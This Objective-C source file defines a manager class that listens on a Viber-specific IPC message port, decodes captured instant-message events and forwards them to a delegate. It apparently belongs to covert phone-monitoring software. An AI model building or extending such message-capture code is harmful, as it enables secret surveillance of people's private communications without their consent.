//
//  ViberCaptureManager.m
//  ViberCaptureManager
//
//  Created by Makara Khloth on 11/27/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "ViberCaptureManager.h"

#import "DefStd.h"
#import "FxIMEvent.h"
#import "FxIMEventUtils.h"

@implementation ViberCaptureManager

@synthesize mEventDelegate;

- (id) init {
	if ((self = [super init])) {
	}
	return (self);
}

- (void) registerEventDelegate: (id <EventDelegate>) aEventDelegate {
	[self setMEventDelegate:aEventDelegate];
}

- (void) unregisterEventDelegate {
	[self setMEventDelegate:nil];
}

- (void) startCapture {
	DLog (@"Start capture Viber messenger");
	if (!mMessagePortReader) {
		mMessagePortReader = [[MessagePortIPCReader alloc] initWithPortName:kViberMessagePort 
												 withMessagePortIPCDelegate:self];
		[mMessagePortReader start];
	}
}

- (void) stopCapture {
	DLog (@"Stop capture Viber messenger");
	if (mMessagePortReader) {
		[mMessagePortReader stop];
		[mMessagePortReader release];
		mMessagePortReader = nil;
	}
}

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	NSKeyedUnarchiver *unarchiver = [[NSKeyedUnarchiver alloc] initForReadingWithData:aRawData];
    FxIMEvent *imEvent = [unarchiver decodeObjectForKey:kViberArchied];
	DLog(@"Viber - imEvent = %@", imEvent);
    [unarchiver finishDecoding];	
		
	if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {		
		NSArray *imStructureEvents = [FxIMEventUtils digestIMEvent:imEvent];	
		for (FxEvent *imStructureEvent in imStructureEvents) {		
			DLog (@"sending %@ ...", imStructureEvent);
			[mEventDelegate performSelector:@selector(eventFinished:) withObject:imStructureEvent];				
		}			
	}
	[unarchiver release];
}

- (void) dealloc {
	[self stopCapture];
	[super dealloc];
}

@end
